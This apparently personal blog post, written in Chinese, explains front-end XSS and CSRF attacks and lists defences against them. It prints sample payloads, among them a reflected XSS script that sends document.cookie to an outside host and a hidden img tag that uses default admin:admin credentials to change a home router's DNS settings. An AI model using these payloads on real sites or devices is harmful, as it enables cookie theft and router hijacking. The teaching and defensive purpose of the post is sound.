---
layout: post
title: 前端安全的那些事
---

> Ajax的兴起，带了前端技术的飞速发展，安全问题已经悄悄的从服务端转了前端。

常见的攻击手段有：

+ XSS（跨站脚本攻击）
+ CSRF(伪造请求攻击)

##XSS（跨站脚本攻击）##

###往web页面里插入恶意的html代码###

####页面中输入DOM节点####

<pre>
	&lt;img src="xxx.gif" onload="window.location.href='johnqing.github.io'"&gt;
</pre>

####页面中输入js脚本####

<pre>
	window.location.href='johnqing.github.io'
</pre>

如果用户在，用户信息等form表单中输入

<pre>
	window.location.href='johnqing.github.io'
</pre>

就会造成用户打开该页面就会执行自动跳转

####基于字符集的XSS####

用户在添加表单时，可输入如下代码：

<pre>
	&lt;p&gt;
</pre>

就可能造成页面错乱

###当用户浏览当前页面时，页面中html代码会被执行###

某网站的一个请求地址 和 页面中代码如下：

http://X.com/search.asp?q=ssss

<pre>
	搜索结果：&lt;?php $_GET('q') ?&gt;
</pre>

好了，俺偷偷伪造一个请求发送给该网站

<pre>
http://X.com/search.asp?q=&lt;script&gt;window.open("http://johnqing.github.io.cn?cookie="+document.cookie)&lt;/script&gt;
</pre>

瞬间，他的cookie信息，都在这了。

###Flash XSS攻击###

当然flash作为web里一直存在的东东，当然也可以攻击。Flash中的getURL()动作，它可以使我们的页面重定向到函数指定的页面。

<pre>
	getURL('javascript:alert(document.cookie)');
</pre>

哈哈 cookie又在我这了。。

###未经验证的跳转造成的跨站###

服务端做302跳转时，跳转的地址来自用户，攻击者 可以输入一个恶意的网址进行跳转来执行脚本。

看了上面的内容，亲们肯定会想到，可以用上面的代码，实现一个钓鱼网站了。（ps：千万别干。。干了也别说我告诉你的。。）

####XSS漏洞修复####

原则：不相信客户输入的数据
注意: 攻击代码不一定在&lt;script&gt;&lt;/script&gt;中

将重要的cookie标记为http only, 这样的话Javascript 的document.cookie语句就不能获取到cookie了.
只允许用户输入我们期望的数据。例如：年龄的textbox中，只允许用户输入数字。 而数字之外的字符都过滤掉。
对数据进行Html Encode 处理
过滤或移除特殊的Html标签， 例如: &lt;script&gt;, &lt;iframe&gt; ,  &lt; for &lt;, &gt; for &gt;, &quot for
过滤JavaScript 事件的标签。例如 "onclick=", "onfocus" 等等。

##CSRF(伪造请求攻击)##

这个例子比较典型了，前几天看到一个同学发了一个他中招的东西，访问一个网站时，它会把你路由器DNS修改为Google 提供的 `8.8.8.8`。
这就是典型的伪造请求攻击。

代码如下：

<pre>
	&lt;img style="display: none; " src="http://admin:admin@192.168.1.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&amp;ip1=192.168.1.100&amp;ip2=192.168.1.199&amp;Lease=120&amp;gateway=0.0.0.0&amp;domain=&amp;dnsserver=&amp;dnsserver=8.8.8.8&amp;dnsserver2=8.8.8.8&amp;Save=%B1%A3+%B4%E6"&gt;
</pre>

可以想象一下，假如你访问的是你的银行账户，而且丫也支持 `GET` 请求，很容易就会被攻击者利用这种漏洞，从账户中把钱拿出来

还有请勿调用第三的文件。

因为如果该文件被加入了攻击性脚本，你整个网站基本都会沦陷。

####CSRF的防御####

1. 限制验证cookie的到期时间。cookie的合法时间越短，黑客利用你的Web应用程序的机会就越小。
2. 验证码。每次的用户提交都需要用户在表单中填写一个图片上的随机字符串。这个方案可以完全解决CSRF，听闻是验证码图片的使用涉及了一个被称为MHTML的Bug，可能在某些版本的微软IE中受影响。
3. 用户在进行重要业务前输入口令。这可以防止黑客发动CSRF攻击（只要浏览器中没有包含口令），因为这种重要信息无法预测或轻易获得。
4. 使用定制的HTTP头。验证是否符合当前请求头。
5. 只允许GET请求检索数据，但是不允许它修改服务器上的任何数据。
